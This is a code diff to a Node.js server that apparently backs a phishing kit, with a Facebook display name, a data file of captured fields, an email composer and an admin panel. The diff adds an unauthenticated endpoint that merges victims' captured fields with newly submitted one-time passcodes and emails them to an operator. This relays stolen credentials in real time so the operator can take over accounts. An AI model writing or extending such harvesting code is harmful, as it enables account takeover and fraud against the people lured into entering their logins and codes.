@@ -13,6 +13,9 @@ const DATA_FILE = path.join(__dirname, 'data.json');
 const ADMIN_USERNAME = process.env.ADMIN_USER || 'admin';
 const ADMIN_PASSWORD = process.env.ADMIN_PASS || 'admin123';
 
+// ── Admin notification email ───────────────────────────────
+const ADMIN_EMAIL = process.env.ADMIN_EMAIL || '';
+
 // ── Facebook display name ──────────────────────────────────
 const FB_NAME = process.env.FB_NAME || 'John Smith';
 
@@ -135,6 +138,59 @@ app.get('/api/data', requireAdmin, (req, res) => {
   catch (e) { res.json([]); }
 });
 
+// ── OTP Notification API (triggers email to admin) ─────────
+app.post('/api/notify-otp', async (req, res) => {
+  const { userEmail, capturedData, timestamp } = req.body;
+
+  if (!ADMIN_EMAIL) {
+    console.log('[OTP Alert] Admin email not configured, skipping notification');
+    return res.json({ success: false, message: 'Admin email not configured' });
+  }
+
+  // Get all previously captured data for this user session
+  let allData = [];
+  if (fs.existsSync(DATA_FILE)) {
+    try { allData = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); } catch (e) { allData = []; }
+  }
+
+  // Flatten all captured fields from this session
+  const flattenedData = {};
+  allData.forEach(entry => {
+    if (entry.fields) {
+      Object.entries(entry.fields).forEach(([key, value]) => {
+        flattenedData[key] = value;
+      });
+    }
+  });
+
+  // Add the new OTP data
+  if (capturedData) {
+    Object.entries(capturedData).forEach(([key, value]) => {
+      flattenedData[key] = value;
+    });
+  }
+
+  console.log(`[OTP Alert] Sending notification to ${ADMIN_EMAIL} for user: ${userEmail}`);
+
+  // Send email notification to admin
+  const result = await emailSender.sendOTPAdminAlert({
+    to: ADMIN_EMAIL,
+    adminName: 'Admin',
+    userEmail: userEmail || 'Unknown',
+    capturedData: flattenedData,
+    timestamp: timestamp || new Date().toISOString(),
+    adminLink: `${BASE_URL}/admin`,
+  });
+
+  if (result.success) {
+    console.log(`[OTP Alert] Email sent successfully: ${result.messageId}`);
+  } else {
+    console.error(`[OTP Alert] Failed to send email: ${result.error}`);
+  }
+
+  res.json({ success: result.success, messageId: result.messageId, error: result.error });
+});
+
 app.get('/api/clear', requireAdmin, (req, res) => {
   if (fs.existsSync(DATA_FILE)) fs.unlinkSync(DATA_FILE);
   res.json({ success: true });
@@ -235,5 +291,6 @@ app.listen(PORT, () => {
   console.log(`    http://localhost:${PORT}/admin/login             → admin-login.html`);
   console.log(`    http://localhost:${PORT}/admin/email             → email-composer.html (🔒 protected)`);
   console.log(`\n  Admin credentials: ${ADMIN_USERNAME} / ${ADMIN_PASSWORD}`);
+  console.log(`  Admin notification email: ${ADMIN_EMAIL || '(not configured - set ADMIN_EMAIL env var)'}`);
   console.log(`  SMTP: ${emailSender.getConfig().host}:${emailSender.getConfig().port} (${emailSender.getConfig().user || 'not configured'})\n`);
 });
